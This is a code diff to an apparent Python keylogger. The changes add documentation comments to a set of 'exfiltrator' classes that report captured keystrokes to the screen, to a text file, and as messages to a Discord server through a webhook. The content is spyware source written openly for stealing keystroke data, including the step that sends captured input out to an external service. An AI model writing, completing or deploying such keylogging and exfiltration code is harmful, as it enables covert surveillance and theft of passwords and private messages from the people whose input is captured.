@@ -19,6 +19,8 @@ class Exfiltrator(abc.ABC):
     def __init__(self, keylogger: KeyLogger, tag: str):
         self.keylogger = keylogger
         self.keylogger.register_exfiltrator(self)
+        '''The self.tag attribute defaults to a formatting similar to
+        KeyLogger::Discord::computer001 if tag is None'''
         self.tag = tag if tag is not None else \
             f"{self.keylogger.__class__.__name__}::" \
             f"{self.__class__.__name__}::" \
@@ -26,14 +28,21 @@ class Exfiltrator(abc.ABC):
 
     @property
     def report(self) -> str:
+        """Get a report based on the data buffered by the keylogger as
+        a string consisting of a tag, timestamp and the data itself."""
+
         timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
         header = f"[{self.tag}] @ {timestamp}"
+        '''The standard report is formatted as follows:
+        KeyLogger::Discord::computer001 @ 10/16/2021 13:30:20 - data'''
         if self.keylogger.has_data:
             return f"{header} - {self.keylogger.contents}"
         return f"{header} - <NO INPUT>"
 
     @abc.abstractmethod
     def update(self, *args, **kwargs):
+        """To be implemented with the logic specific to each
+        exfiltration mechanism."""
         ...
 
 
@@ -44,6 +53,7 @@ class Screen(Exfiltrator):
         super().__init__(keylogger, tag)
 
     def update(self) -> None:
+        """Display captured data at STDOUT for debugging purposes."""
         print(self.report)
 
 
@@ -56,6 +66,8 @@ class TextFile(Exfiltrator):
         self.file_path = file_path
 
     def update(self) -> None:
+        """Write each report on a new line of text file with the
+        specified path."""
         if self.keylogger.has_data:
             with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                 file.write(f"{self.report}\n")
@@ -70,6 +82,8 @@ class Discord(Exfiltrator):
         self.webhook_url = webhook_url
 
     def update(self) -> None:
+        """Send each report as a new message to a Discord server with a
+        Webhook URL enabled."""
         if self.keylogger.has_data:
             asyncio.run(self.send_message())
 
